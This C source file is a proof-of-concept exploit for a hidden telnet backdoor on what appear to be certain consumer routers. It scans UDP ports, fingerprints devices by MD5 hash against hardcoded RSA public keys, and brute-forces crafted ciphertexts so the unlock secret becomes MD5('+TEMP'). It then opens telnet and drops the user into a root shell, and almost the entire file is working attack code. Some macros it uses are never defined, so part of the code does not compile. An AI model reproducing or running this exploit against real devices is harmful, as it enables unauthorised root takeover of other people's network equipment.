#include <stdio.h>
#include <sys/time.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <openssl/bn.h>
//#include <openssl/err.h>
#include <openssl/md5.h>
#include <openssl/rsa.h>

#define SCAN_DELAY  300000
#define STAGE_DELAY 100000
#define BACKDOOR_PORT 21210
#define TELNET_PORT 23
#define PLAINTEXT_LENGTH 0x20
#define CIPHERTEXT_LENGTH 0x80
#define MAX_TRIES 2048

#define NO_FLAGS 0
#define WIPE() { memset(plaintext, 0, PLAINTEXT_LENGTH+1); memset(ciphertext, 0, CIPHERTEXT_LENGTH); }




void print_from(struct sockaddr_in *from) {
  char *ns;
  ns = inet_ntoa(from->sin_addr);
  fprintf(stdout, "[<] remote address %s:%d\n", ns, ntohs(from->sin_port) & 0xFFFF);
  return;
}

/////// Hexdump code

void fhexdump(FILE *fd, unsigned char *data, int len) {
  int i;
  for (i = 0; i < len; i++) {
    if (i % 16 == 0) {
      fprintf(fd, "\n");
    } else if (i % 8 == 0) {
      fprintf(fd, "  ");
    } else {
      fprintf(fd, " ");
    }
    fprintf(fd, "%02x", data[i]);
  }
  fprintf(fd, "\n\n");
}


void hexdump(unsigned char *data, int len) {
  fhexdump(stdout, data, len);
}


void bar(char ch) {
  int i;
  for (i = 0; i < 65; i++) {
    putc(ch, stdout);
  }
  putc('\n', stdout);
  return;
}


////// MD5 Code

int md5raw(unsigned char *out, const unsigned char *in, int len) {
  MD5_CTX c;
  MD5_Init(&c);
  MD5_Update(&c, in, len);
  MD5_Final(out, &c);
  return 0;
}

unsigned char *device_identifying_hash(const char *identifier) {
  unsigned char buffer[0x80];
  unsigned char *hash;
  hash = calloc(16, sizeof(char));
  memset(buffer, 0, 0x80);
  strcpy((char *) buffer, identifier);
  md5raw(hash, (const unsigned char *) buffer, 0x80);
  return hash;
}

////// RSA stuff





RSA *init_rsa(const char *public_n, const char *public_e) {
  BIGNUM *e;
  BIGNUM *n;
  RSA *rsa;
  rsa = RSA_new();
  n = BN_new();
  e = BN_new();
  BN_hex2bn(&n, public_n);
  BN_hex2bn(&e, public_e);
  rsa->e = e;
  rsa->n = n;
  return rsa;
}


int decrypt_with_pubkey(RSA *rsa, unsigned char *ciphertext, unsigned char *plaintext) {
  int sz;
  memset(plaintext, 0, PLAINTEXT_LENGTH);
  sz = RSA_size(rsa);
  fprintf(stderr, "[-] RSA_size(rsa) = %d\n", sz);
  return RSA_public_decrypt(sz, ciphertext, plaintext, rsa, RSA_NO_PADDING);
}


int encrypt_with_pubkey(RSA *rsa, unsigned char *plaintext, unsigned char *ciphertext) {
  int sz;
  memset(ciphertext,0,CIPHERTEXT_LENGTH);
  sz = RSA_size(rsa);
  fprintf(stderr, "[-] RSA_size(rsa) = %d\n", sz);
  return RSA_public_encrypt(sz, plaintext, ciphertext, rsa, RSA_NO_PADDING); 
}


//// RSA test code
//
//


/***
 *
 * Expected test case
 *
=====
S<:2\\fPve:j%lJ$j%A[DGQ-v|p,-;Tr
-----
	0xdd	0x02	0x0a	0x44	0x45	0x84	0xbd	0xf4
	0x86	0x8f	0x32	0xa3	0xad	0xbf	0x25	0x06
	0x5b	0x5a	0x75	0x9c	0x06	0xb1	0xad	0xf5
	0xb1	0x41	0x0e	0xaa	0xcc	0x61	0xcc	0x01
	0xfd	0x59	0xb8	0xbd	0x7b	0x19	0x17	0x78
	0xa2	0x77	0xac	0xae	0x40	0x43	0x5a	0xa8
	0x25	0x78	0xda	0x6c	0xae	0x93	0x56	0xb7
	0xc2	0x47	0x14	0x1b	0xb0	0xef	0x70	0xc3
	0x95	0x27	0x3d	0x3c	0xde	0x3c	0x34	0x21
	0xf4	0xc7	0xef	0xf0	0xa0	0x7a	0xff	0xf4
	0x66	0x5f	0xdf	0x19	0x57	0x5e	0xe5	0x92
	0x2b	0x16	0xa8	0x17	0x21	0xe6	0xc6	0x30
	0x7e	0x60	0x9a	0xdd	0x04	0xda	0xe5	0xe2
	0x63	0xff	0x2f	0x12	0x0c	0xa2	0x6f	0x6e
	0x6a	0x27	0x9c	0xa9	0x4a	0x3e	0x01	0x5f
	0x19	0x60	0xfc	0x1e	0x7d	0xc4	0x94	0xf7
*/


int test() {
  unsigned char ciphertext[CIPHERTEXT_LENGTH];
  char test_case[PLAINTEXT_LENGTH] = "S<:2\\fPve:j%lJ$j%A[DGQ-v|p,-;Tr";
  int res;
  RSA *rsa;

  rsa = init_rsa("E541A631680C453DF31591A6E29382BC5EAC969DCFDBBCEA64CB49CBE36578845C507BF5E7A6BCD7"
                 "24AFA7063CA754826E8D13DBA18A2359EB54B5BE3368158824EA316A495DDC3059C478B41ABF6B38"
                 "8451D38F3C6650CDB4590C1208B91F688D0393241898C1F05A6D500C7066298C6BA2EF310F6DB2E7"
                 "AF52829E9F858691",
                 "010001");

  unsigned char expected[CIPHERTEXT_LENGTH] = {
	0xdd,	0x02,	0x0a,	0x44,	0x45,	0x84,	0xbd,	0xf4,
	0x86,	0x8f,	0x32,	0xa3,	0xad,	0xbf,	0x25,	0x06,
	0x5b,	0x5a,	0x75,	0x9c,	0x06,	0xb1,	0xad,	0xf5,
	0xb1,	0x41,	0x0e,	0xaa,	0xcc,	0x61,	0xcc,	0x01,
	0xfd,	0x59,	0xb8,	0xbd,	0x7b,	0x19,	0x17,	0x78,
	0xa2,	0x77,	0xac,	0xae,	0x40,	0x43,	0x5a,	0xa8,
	0x25,	0x78,	0xda,	0x6c,	0xae,	0x93,	0x56,	0xb7,
	0xc2,	0x47,	0x14,	0x1b,	0xb0,	0xef,	0x70,	0xc3,
	0x95,	0x27,	0x3d,	0x3c,	0xde,	0x3c,	0x34,	0x21,
	0xf4,	0xc7,	0xef,	0xf0,	0xa0,	0x7a,	0xff,	0xf4,
	0x66,	0x5f,	0xdf,	0x19,	0x57,	0x5e,	0xe5,	0x92,
	0x2b,	0x16,	0xa8,	0x17,	0x21,	0xe6,	0xc6,	0x30,
	0x7e,	0x60,	0x9a,	0xdd,	0x04,	0xda,	0xe5,	0xe2,
	0x63,	0xff,	0x2f,	0x12,	0x0c,	0xa2,	0x6f,	0x6e,
	0x6a,	0x27,	0x9c,	0xa9,	0x4a,	0x3e,	0x01,	0x5f,
	0x19,	0x60,	0xfc,	0x1e,	0x7d,	0xc4,	0x94,	0xf7
  };

  printf("[=] Test case: '%s'\n", test_case);
  encrypt_with_pubkey(rsa, (unsigned char *) test_case, ciphertext);

  res = memcmp(ciphertext, expected, CIPHERTEXT_LENGTH);
  if (res != 0) {
    printf("[X] FAILED TEST CASE!\n");
    exit(1);
  }
  hexdump(ciphertext, CIPHERTEXT_LENGTH);

  printf("\n[*] TEST SUCCESSFUL!\n");

  return res;
}



//// Network code


int communicate(char *ip_addr, 
    unsigned int port,
    unsigned char *msg, 
    unsigned int msg_len, 
    unsigned char *resp,
    unsigned int resp_len,
    long int recv_timeout) {


  int sockfd;
  size_t n;
  unsigned int len;
  struct timeval tv;
  tv.tv_sec =  recv_timeout / 1000000;
  tv.tv_usec = recv_timeout % 1000000;

  n = 0;

  struct sockaddr_in server_addr;
  memset(&server_addr,0,sizeof(struct sockaddr_in));
  struct sockaddr_in server_resp_addr;
  memset(&server_resp_addr, 0, sizeof(struct sockaddr_in));

  sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if(sockfd == -1){
    puts("[x] Failed to create socket. Fatal.");
    exit(1);
  }
  


  // Set address information
  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = inet_addr(ip_addr);
  server_addr.sin_port = htons(port);
  
  printf("[>] Sending message to %s on UDP port %d:\n", ip_addr, port);
  hexdump(msg, msg_len);

  sendto(sockfd, (const char*) msg, msg_len, NO_FLAGS, 
      (const struct sockaddr *) &server_addr,
      sizeof(server_addr));

  printf("[>] Message sent.\n");


  if (resp_len > 0) {
    printf("[-] Expecting %d bytes in reply...\n", resp_len);
    printf("[-] Setting socket timeout to %lds + %ldus\n", tv.tv_sec, tv.tv_usec);
    //setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    // Here we might want to read from the socket in chunks, without
    // blocking indefinitely...
    //
    n = recvfrom(sockfd, resp, resp_len, NO_FLAGS,
        (struct sockaddr *) &server_resp_addr, &len);

    print_from(&server_resp_addr);

    printf("\n[<] Received %ld bytes in reply:\n", n);
    hexdump(resp, n);
  }

  close(sockfd);

  return n;
}



int check_tcp_port(char *ip_addr, int port) {
  int sockfd;

  printf("[>] Checking TCP port %d on %s...\n", port, ip_addr);
  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if(sockfd == -1){
    puts("[x] Failed to create socket. Fatal.");
    exit(1);
  }
  struct sockaddr_in server_addr;
  memset(&server_addr,0,sizeof(struct sockaddr_in));

  // Set address information
  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = inet_addr(ip_addr);
  server_addr.sin_port = htons(port);
  if (connect(sockfd,(struct sockaddr *) &server_addr,sizeof(server_addr)) < 0) {
    printf("[x] TCP port %d on %s is closed.\n", port, ip_addr);
    close(sockfd);
    return 0;
  } else {
    printf("[!] TCP port %d on %s is open.\n", port, ip_addr);
    close(sockfd);
    return 1;
  }
}


struct DeviceList {
  unsigned char *hash;
  const char *identifier;
  const char *public_n;
  const char *public_e;
  struct DeviceList *next;
};


struct DeviceList * add_entry_to_device_list(struct DeviceList *DL, 
    const char *identifier,
    const char *public_n,
    const char *public_e) {
  struct DeviceList * node;
  node = DL;

  unsigned char buffer[0x80];
  memset(buffer, 0, 0x80);
  
  if (node->identifier != NULL) {
    // first, find the end of the list:
    for (node = DL; node->next != NULL; node = node->next) {
      if (!strcmp(node->identifier, identifier)) {
        printf("[-] %s already appears in device list.\n", identifier);
        return node;
      }
    }

    // The empty cell is now at node->next
    node->next = malloc(sizeof(struct DeviceList));
    memset(node->next, 0, sizeof(struct DeviceList));
    node = node->next;
  }

  node->identifier = strdup(identifier);
  node->hash = device_identifying_hash(identifier);
  node->public_n = strdup(public_n);
  node->public_e = public_e;

  printf("[+] Added device to list:\n"
      "    - identifier: %s\n"
      "    - public_n: 0x%s\n"
      "    - public_e 0x%s\n"
      "    - hash:\n",
      identifier,
      public_n,
      public_e);
  hexdump(node->hash, 16);

  return node;
}


struct DeviceList * lookup_device_hash(struct DeviceList *DL, unsigned char *hash) {
  struct DeviceList *node; 
  node = DL;  
  for (node = DL; node != NULL; node = node->next) {
    if (!memcmp(hash, node->hash, 16)) {
      printf("[+] Found matching hash. Identifier: %s\n", node->identifier);
      return node;
    }
  }
  return NULL;
}


struct DeviceList * init_device_list() {
  struct DeviceList *DL;
  DL = (struct DeviceList *) malloc(sizeof(struct DeviceList));
  memset(DL, 0, sizeof(struct DeviceList));

  add_entry_to_device_list(DL,
    "K2_COSTDOWN__VER_3.0",
    "E541A631680C453DF31591A6E29382BC5EAC969DCFDBBCEA64CB49CBE36578845C507BF5E7A6BCD7"
    "24AFA7063CA754826E8D13DBA18A2359EB54B5BE3368158824EA316A495DDC3059C478B41ABF6B38"
    "8451D38F3C6650CDB4590C1208B91F688D0393241898C1F05A6D500C7066298C6BA2EF310F6DB2E7"
    "AF52829E9F858691",
    "010001");

  add_entry_to_device_list(DL,
    "K3C_INTELALL_VER_3.0",
    "E7FFD1A1BB9834966763D1175CFBF1BA2DF53A004B62977E5B985DFFD6D43785E5BCA088A6417BAF"
    "070BCE199B043C24B03BCEB970D7E47EEBA7F59D2BE4764DD8F06DB8E0E2945C912F52CB31C56C83"
    "49B689198C4A0D88FD029CCECDDFF9C1491FFB7893C11FAD69987DBA15FF11C7F1D570963FA3825B"
    "6AE92815388B3E03",
    "010001");


  return DL;
}



struct DeviceList * probe_udp_port(struct DeviceList *DL, 
    char *ip_addr, 
    int port, 
    unsigned char *token, 
    int token_len) {
  int n;
  unsigned int len;
  unsigned char buffer[0x80];
  struct DeviceList *device_info;

  memset(buffer, 0, 0x80);
  
  int sockfd, res;
  struct sockaddr_in server_addr;
  memset(&server_addr,0,sizeof(struct sockaddr_in));

  sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

  // Set address information
  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = inet_addr(ip_addr);
  server_addr.sin_port = htons(port);
  
  printf("[-] Probing UDP port %d on %s...\n", port, ip_addr);
  //hexdump(token, token_len);

  res = sendto(sockfd, (const char*) token, token_len, NO_FLAGS, 
      (const struct sockaddr *) &server_addr,
      sizeof(server_addr));

  usleep(SCAN_DELAY);

  if (res < 0) {
    printf("[x] sendto() failed.\n");
    return NULL;
  }

  n = recvfrom(sockfd, buffer, 1, MSG_PEEK|MSG_DONTWAIT,
      (struct sockaddr *) &server_addr,
      &len);

  if (n < 1) {
    printf("[-] no response on port %d\n", port);
    return NULL;
  }

  printf("[+] response incoming...\n");

  memset(buffer, 0, 0x80);

  n = recvfrom(sockfd, buffer, 16, MSG_WAITALL,
      (struct sockaddr *) &server_addr,
      &len);
  printf("[+] Received %d bytes in reply to token on UDP port %d:\n", n, port);
  hexdump(buffer, n);
  if (n == 16) {
    device_info = lookup_device_hash(DL, buffer);
    return device_info;
  }

  close(sockfd);

  return NULL; 
}

//// Exploit

#define PHONY_CIPHERTEXT_LENGTH 0x80

void random_buffer(unsigned char *buf, int len) {
  FILE *urandom;
  urandom = fopen("/dev/urandom", "rb");
  fread(buf, sizeof(unsigned char), len, urandom);
  fclose(urandom);
  return;
}

unsigned char *find_phony_ciphertext(RSA *rsa) {
  unsigned char *phony_ciphertext;
  unsigned char phony_plaintext[1024];
  int plaintext_length;
  memset(phony_plaintext, 0, 0x20);
  phony_ciphertext = calloc(PHONY_CIPHERTEXT_LENGTH, sizeof(char));
  do {

    random_buffer(phony_ciphertext, PHONY_CIPHERTEXT_LENGTH);
    phony_ciphertext[0] || (phony_ciphertext[0] |= 1);

    if (rsa == NULL) {
      // If we don't have the public key, we can still try just
      // throwing random buffers at the target and see what
      // sticks.
      printf("[-] We don't have a matching public key for this target\n"
          "    so we'll just throw random buffers at it and see what sticks.\n"
          "    returning:\n");
      hexdump(phony_ciphertext, PHONY_CIPHERTEXT_LENGTH);
      return phony_ciphertext;
    }
    plaintext_length = decrypt_with_pubkey(rsa, phony_ciphertext, phony_plaintext); 
    // If the first character of phony_plaintext is printable, then
    // there is a chance it will collide with the first character of
    // the secret, random string. Since the phony_plaintext will be
    // XORed with the random string, this will produce a null byte at
    // offset 0. And THIS will cause the string concatenation
    // operation that's used to produce the telnet activation keys
    // to append an EMPTY STRING to the salt/suffix. And this will
    // make the MD5 hash of the secret predictable.
    if ((plaintext_length < 0x101) && 
        (0x21 <= phony_plaintext[0]) && 
        (phony_plaintext[0] < 0x7f)) {
      printf("[!] Found stage 2 payload:\n");
      hexdump(phony_ciphertext, PHONY_CIPHERTEXT_LENGTH);
      printf("[=] Decrypts to (%d bytes):\n", plaintext_length);
      hexdump(phony_plaintext, plaintext_length);
      return phony_ciphertext;
    }
  } while (1);
}



int main(int argc, char **argv) {
  unsigned char ciphertext[CIPHERTEXT_LENGTH];
  unsigned char plaintext[PLAINTEXT_LENGTH+1];
  RSA *rsa;
  rsa = NULL;
  WIPE();

  if (argc == 1) {
    printf("[?] Usage: %s [<test|enc $length|dec $length>| <ip addr>]\n", argv[0]);
    exit(1);
  }
  

  if (!(strcmp(argv[1], "test"))) {
    test();
    exit(0);
  }

  if (!(strcmp(argv[1], "enc"))) {
    rsa = init_rsa(K2G_HARDCODED_n, K2G_HARDCODED_e);
    fread(plaintext, sizeof(char), PLAINTEXT_LENGTH, stdin);
    fflush(stdin);
    fprintf(stderr, "[+] Read data:\n");
    fhexdump(stderr, plaintext, PLAINTEXT_LENGTH);
    fprintf(stderr, "[+] Encrypting plaintext '%s' of length %ld\n", plaintext, 
        strlen((char *) plaintext));
    encrypt_with_pubkey(rsa, plaintext, ciphertext);
    hexdump(ciphertext, CIPHERTEXT_LENGTH);
    exit(0);
  } else if (!(strcmp(argv[1], "dec"))) {
    rsa = init_rsa(K2G_HARDCODED_n, K2G_HARDCODED_e);
    fread(ciphertext, sizeof(char), CIPHERTEXT_LENGTH, stdin);
    fprintf(stderr, "[+] Read data:\n");
    fhexdump(stderr, ciphertext, CIPHERTEXT_LENGTH);
    fprintf(stderr, "[+] Decrypting with public key...\n");
    decrypt_with_pubkey(rsa, ciphertext, plaintext);
    hexdump(plaintext, PLAINTEXT_LENGTH);
    fprintf(stderr, "[+] strlen(decrypt_with_pubkey(payload)) = %ld\n", strlen((char *) plaintext)); 
    exit(0);
  }
     

  /** The exploit **/

  char *ip_addr = argv[1]; 
  const char *handshake_token = "ABCDEF1234";
  unsigned char *phony_ciphertext;
  unsigned char backdoor_key[16];
  const char *magic_salt = "+TEMP";
  unsigned char buffer[CIPHERTEXT_LENGTH];
  int tries = MAX_TRIES;
  char *telnet_command;
  struct timeval timecheck;
  long int start;
  long int elapsed;
  int number_of_ports_to_scan;
  int i;
  int *ports_to_scan;
  int backdoor_port;
  int CHAOS_MODE = 0;

  int stage_delay = STAGE_DELAY;
  struct DeviceList *device_list;
  struct DeviceList *device_info;
  device_list = init_device_list();

  if ((argc < 3) || strcmp(argv[2], "scan")) {
    number_of_ports_to_scan = 1;
    ports_to_scan = NULL;
    if (argc < 3) {
      backdoor_port = 21210;
    } else {
      backdoor_port = atoi(argv[2]);
    }
  } else {
    number_of_ports_to_scan = argc - 3;
    ports_to_scan = calloc(number_of_ports_to_scan, sizeof(int));
    int p = 0;
    for (i = 3; i < argc; i++) {
      // check to see if a range is given
      char *upper, *lower;
      int upper_port, lower_port;
      lower = strtok(argv[i], "-");
      upper = strtok(NULL, "-");
      lower_port = atoi(lower);
      if (upper != NULL) {
        printf("[+] Found range delimiter in %s\n", argv[i]);
        int *ports_to_scan_new;
        upper_port = atoi(upper);
        printf("[+] lower = %d, upper = %d\n", lower_port, upper_port);
        number_of_ports_to_scan += (upper_port - lower_port);
        ports_to_scan_new = calloc(number_of_ports_to_scan, sizeof(int));
        memcpy(ports_to_scan_new, ports_to_scan, p * sizeof(int));
        free(ports_to_scan);
        ports_to_scan = ports_to_scan_new;
        int P;
        for (P = lower_port; P <= upper_port; P++) {
          printf("[+] Adding port %d to scan list\n", P);
          ports_to_scan[p] = P;
          p++;
        }
      } else {
        printf("[+] Adding port %d to scan list\n", lower_port);
        ports_to_scan[p] = lower_port;
        p++;
      }
    }
  }


  telnet_command = malloc(0x80 * sizeof(char));
  sprintf(telnet_command, "telnet %s 23", ip_addr);
  
  if (check_tcp_port(ip_addr, TELNET_PORT)) {
    printf("[!] The back door is already open! Why not killall telnetd and try again?\n");
    system(telnet_command);
    printf("[*] Have a nice day.\n");
    exit(0);
  }

  gettimeofday(&timecheck, NULL);
  start = (long)timecheck.tv_sec * 1000 + (long)timecheck.tv_usec / 1000;

  //////////////////////////
  // Port scan
  // ////////////////////////
  if (ports_to_scan != NULL) {
    printf("[+] About to scan %d ports...\n", number_of_ports_to_scan);
    for (i = 0; i < number_of_ports_to_scan; i++) {
      backdoor_port = ports_to_scan[i];
      device_info = probe_udp_port(device_list, 
          ip_addr, backdoor_port, 
          (unsigned char *) handshake_token, 
          strlen((char *) handshake_token)); 
      if (device_info != NULL) {
        break;
      }
    }
  

    if (device_info == NULL) {
      printf("[x] Failed to solicit identifying handshake on the following ports:\n");
      for (i = 0; i < number_of_ports_to_scan; i++) {
        printf("    - %d\n", ports_to_scan[i]);
      }
      if (number_of_ports_to_scan > 1) {
        exit(1);
      } else {
        printf("[+] But you only specified one port, so we'll perservere with a null key.\n");
        rsa = NULL;
        CHAOS_MODE = 1;
        goto STAGE_II;
      }
    } else {
      rsa = init_rsa((char *) device_info->public_n, device_info->public_e);
      goto STAGE_II;
    }
  }



#define QUALITY_CONTROL(__com_res) { if ((__com_res) == -1) { \
  printf("[x] What we have here is a failure to communicate.\n"); \
  stage_delay += 1000; \
  /* goto STAGE_I; */ \
} else if (stage_delay > 100) { \
  stage_delay -= 100; \
} }

  /* something should be done here to reset the state machine */
  int on_try = 0;
  int com_res = 0;
  do {
    
    goto STAGE_I;

STAGE_I:
    on_try += 1;
    usleep(stage_delay);
    memset(buffer, 0, 0x80);
    bar('=');
    printf("[*] ENTERING STAGE I (round %d/%d) (delay = %d)%s\n", on_try, tries,
        stage_delay,
        CHAOS_MODE ? " IN CHAOS MODE" : "");
    bar('=');
    printf("[+] Sending handshake token: %s\n", handshake_token);
    printf("[-] Waiting for device identifying hash...\n");
    QUALITY_CONTROL(communicate(ip_addr, backdoor_port,
        (unsigned char *) handshake_token,
        strlen((char *) handshake_token),
        buffer,
        16,
        stage_delay));

    printf("[+] Received device identifying hash:\n");
    hexdump(buffer, 16);

    if (!CHAOS_MODE) {
      if (device_info == NULL) {
        if ((device_info = lookup_device_hash(device_list, buffer))) {
          rsa = init_rsa((char *) device_info->public_n, device_info->public_e);
        } else {
          CHAOS_MODE = 1;
        }
      } else {
        // not strictly necessary, but I like to make sure everything's in order
        if (0 != memcmp(device_info->hash, buffer, 16)) {
          printf("[x] Discrepancy in device identifying hash. Expected:\n");
          hexdump(device_info->hash, 16);
          if (rsa != NULL) {
            exit(1);
          }
        } else {
          printf("[+] Device identifying hash matches expected value.\n");
        }
      }
    } else {
      printf("[!] Not checking hash (CHAOS MODE).\n");
    }

    goto STAGE_II;

STAGE_II:
    usleep(stage_delay);
    memset(buffer, 0, 0x80);
    bar('=');
    printf("[*] ENTERING STAGE II (round %d/%d) (delay = %d)%s\n", on_try, tries,
        stage_delay,
        CHAOS_MODE ? " IN CHAOS MODE" : "");
    bar('=');
    memset(buffer, 0, CIPHERTEXT_LENGTH);
    phony_ciphertext = find_phony_ciphertext(rsa);  
    // This blocks and waits too long in CHAOS_MODE
    com_res = communicate(ip_addr, backdoor_port,
        phony_ciphertext,
        PHONY_CIPHERTEXT_LENGTH,
        buffer,
        CIPHERTEXT_LENGTH,
        stage_delay);
    free(phony_ciphertext);
    QUALITY_CONTROL(com_res);

    goto STAGE_III;

STAGE_III:
    usleep(stage_delay);
    memset(buffer, 0, 0x80);
    bar('=');
    printf("[*] ENTERING STAGE III (round %d/%d) (delay = %d)%s\n", on_try, tries, 
        stage_delay,
        CHAOS_MODE ? " IN CHAOS MODE" : "");
    bar('=');
    memset(backdoor_key, 0, 0x10);
    printf("[+] Sending MD5('%s') and hoping for collision...\n",
        (char *) magic_salt);
    md5raw(backdoor_key, (unsigned char *) magic_salt, strlen(magic_salt));
    com_res = communicate(ip_addr, backdoor_port,
        backdoor_key,
        0x10,
        buffer,
        0,
        stage_delay);
    QUALITY_CONTROL(com_res);

    /* Now test to see if the telnet port is open. */

    usleep(stage_delay);
    if (check_tcp_port(ip_addr, TELNET_PORT)) {

      gettimeofday(&timecheck, NULL);
      elapsed = ((long)timecheck.tv_sec * 1000 + (long)timecheck.tv_usec / 1000) - start;

      printf("[*] Backdoor lock picked in %ld msec with %d attempts.\n", elapsed, on_try);
      printf("[*] Please enjoy your root shell.\n");
      system(telnet_command);
      printf("[*] PoC complete. Have a nice day.\n");
      exit(0);
    } else {
      printf("[+] Not yet. %d tries remaining...\n", tries-on_try);
    }

  } while (tries - on_try > 0);
  
  return 0;
}

